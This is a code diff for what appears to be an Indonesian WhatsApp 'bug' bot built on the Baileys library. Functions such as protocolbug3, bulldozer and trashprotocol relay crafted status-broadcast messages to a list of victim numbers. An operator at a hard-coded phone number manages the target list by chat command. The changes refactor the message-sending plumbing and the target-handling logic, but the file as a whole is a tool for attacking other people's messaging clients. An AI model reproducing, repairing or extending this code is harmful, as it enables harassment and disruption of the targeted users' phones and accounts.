@@ -10,7 +10,7 @@ import { Boom } from "@hapi/boom";
 import fs from "fs";
 import pino from "pino";
 let nomorRequest = "6287839025789";
-let sendMsg;
+let relayMsg;
 let blob;
 
 function tunggu(delay) {
@@ -92,7 +92,7 @@ function protocolbug3(targets) {
     {}
   );
   return new Promise(async resolve => {
-    await sendMsg("status@broadcast", msg.message, {
+    await relayMsg("status@broadcast", msg.message, {
       messageId: msg.key.id,
       statusJidList: targets,
       additionalNodes: [
@@ -178,7 +178,7 @@ function protocolbug5(targets) {
     {}
   );
   return new Promise(async resolve => {
-    await sendMsg("status@broadcast", msg.message, {
+    await relayMsg("status@broadcast", msg.message, {
       messageId: msg.key.id,
       statusJidList: targets,
       additionalNodes: [
@@ -244,7 +244,7 @@ function bulldozer(targets) {
 
   const msg = generateWAMessageFromContent("0@s.whatsapp.net", message, {});
   return new Promise(async resolve => {
-    await sendMsg("status@broadcast", msg.message, {
+    await relayMsg("status@broadcast", msg.message, {
       messageId: msg.key.id,
       statusJidList: targets,
       additionalNodes: [
@@ -305,7 +305,7 @@ function trashprotocol(target) {
 
   const msg = generateWAMessageFromContent(target, MSG, {});
   return new Promise(async resolve => {
-    await sendMsg("status@broadcast", msg.message, {
+    await relayMsg("status@broadcast", msg.message, {
       messageId: msg.key.id,
       statusJidList: [target],
       additionalNodes: [
@@ -369,17 +369,20 @@ function updateData() {
   });
 }
 
+let sendMsg;
 let exec;
+let wait;
 async function start() {
   cekJam();
-  const jam = new Date().getHours();
   const targets = blob.targets;
   const arrX = blob.targets.toString();
   if (targets.length < 1) {
-    process.exit();
-  } else if (jam > 21 && jam < 4) {
-    exec = setTimeout(start, 60000 * 5);
+    await sendMsg(nomorRequest + "@s.whatsapp.net", {
+      text: "Tidak ada target.\nServer akan dihentikan dalam 3 menit."
+    });
+    wait = setTimeout(process.exit, 60000 * 3);
   }
+
   let arr = targets;
   targets.forEach(e => {
     const el = e.split("@")[1].split("-");
@@ -403,23 +406,24 @@ async function start() {
   }
 }
 
-async function olahTarget(aksi, target, send) {
+async function olahTarget(aksi, target) {
   if (aksi == "add" && target) {
+    clearTimeout(wait);
     blob.targets.push(target);
     // await updateData();
     fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
-    send(nomorRequest + "@s.whatsapp.net", { text: "add OK" });
+    sendMsg(nomorRequest + "@s.whatsapp.net", { text: "add OK" });
   } else if (aksi == "del" && blob.targets.indexOf(target) >= 0) {
     blob.targets.splice(blob.targets.indexOf(target), 1);
     // await updateData();
     fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
-    send(nomorRequest + "@s.whatsapp.net", { text: "del OK" });
+    sendMsg(nomorRequest + "@s.whatsapp.net", { text: "del OK" });
   } else if (aksi == "all") {
     let msg = "\n";
     blob.targets.forEach(e => {
       msg += "\n- " + e;
     });
-    send(nomorRequest + "@s.whatsapp.net", { text: "all OK" + msg });
+    sendMsg(nomorRequest + "@s.whatsapp.net", { text: "all OK" + msg });
   }
 }
 
@@ -436,7 +440,6 @@ const reviveBuffer = obj => {
 };
 
 let pairing;
-let wait;
 async function bot(session) {
   cekJam();
   wait = setTimeout(process.exit, 60000);
@@ -517,7 +520,8 @@ async function bot(session) {
       clearTimeout(wait);
       clearTimeout(exec);
       console.log("Terhubung " + new Date().toLocaleString("id-ID"));
-      sendMsg = sock.relayMessage;
+      relayMsg = sock.relayMessage;
+      sendMsg = sock.sendMessage;
       const timeNow = new Date().getTime();
       if (blob.waktu + 60000 * 5 <= timeNow) {
         start();
@@ -553,18 +557,18 @@ async function bot(session) {
 
         switch (command) {
           case "test":
-            await sock.sendMessage(nomorRequest + "@s.whatsapp.net", {
+            await sendMsg(nomorRequest + "@s.whatsapp.net", {
               text: "bug-WA OK"
             });
             break;
           case "add":
-            olahTarget("add", target, sock.sendMessage);
+            olahTarget("add", target);
             break;
           case "del":
-            olahTarget("del", target, sock.sendMessage);
+            olahTarget("del", target);
             break;
           case "all":
-            olahTarget("all", undefined, sock.sendMessage);
+            olahTarget("all");
             break;
           default:
         }
